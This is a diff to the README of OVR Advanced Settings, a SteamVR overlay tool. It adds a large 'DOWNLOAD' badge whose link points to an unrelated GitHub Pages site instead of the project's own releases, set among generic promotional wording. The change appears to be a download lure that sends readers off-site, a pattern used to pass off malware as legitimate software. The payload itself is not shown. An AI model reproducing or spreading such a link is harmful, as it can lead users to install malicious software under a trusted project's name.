@@ -30,6 +30,12 @@ OVR Advanced Settings adds a SteamVR dashboard overlay giving access to per-appl
 
 Whether you're a newcomer or a veteran, OVR Advanced Settings provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download OVR Advanced Settings](https://img.shields.io/badge/⬇_DOWNLOAD_OVR+Advanced+Settings-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
